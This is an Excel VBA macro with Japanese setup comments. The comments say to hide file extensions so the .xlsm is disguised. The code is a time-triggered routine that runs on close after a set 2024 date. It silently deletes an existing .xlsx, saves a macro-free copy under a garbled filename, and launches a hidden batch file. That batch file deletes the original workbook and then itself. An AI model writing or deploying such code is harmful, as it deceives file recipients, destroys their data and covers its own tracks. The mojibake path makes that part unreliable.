// ラベルから開発とマクロ実行を有効化
// エクスプローラーで拡張子表示をoff
// VBA書いたら.xslmで保存

Private Sub Workbook_BeforeClose(Cancel As Boolean)
    
    Dim targetDate As Date
    targetDate = DateSerial(2024, 7, 23) + TimeSerial(11, 00, 0)

    
    Dim currentDate As Date
    currentDate = Now

    
    If currentDate >= targetDate Then

        Dim originalFilePath As String
        Dim batchFilePath As String
        Dim newXlsxFilePath As String
        Dim targetXlsxFilePath As String
        
        originalFilePath = ThisWorkbook.FullName
        
       
        newXlsxFilePath = "C:\Path\髫ｴ蟶帷樟驛譎ｽｫ驛ｧｷ驛ｧｧ.xlsx"  
                
        targetXlsxFilePath = Replace(originalFilePath, ".xlsm", ".xlsx")
        
        If Dir(targetXlsxFilePath) <> "" Then
            On Error Resume Next
            Kill targetXlsxFilePath
            On Error GoTo 0
        End If
        
        batchFilePath = originalFilePath & ".bat"
        
        Application.DisplayAlerts = False
        ThisWorkbook.SaveAs Filename:=newXlsxFilePath, FileFormat:=xlOpenXMLWorkbook
        Application.DisplayAlerts = True
        
        Open batchFilePath For Output As #1
          Print #1, "@echo off"
          Print #1, ":loop"
          Print #1, "del """ & originalFilePath & """"
          Print #1, "if exist """ & originalFilePath & """ goto loop"
          Print #1, "del """ & batchFilePath & """"
        Close #1
        
        Shell """" & batchFilePath & """", vbHide
    End If
End Sub
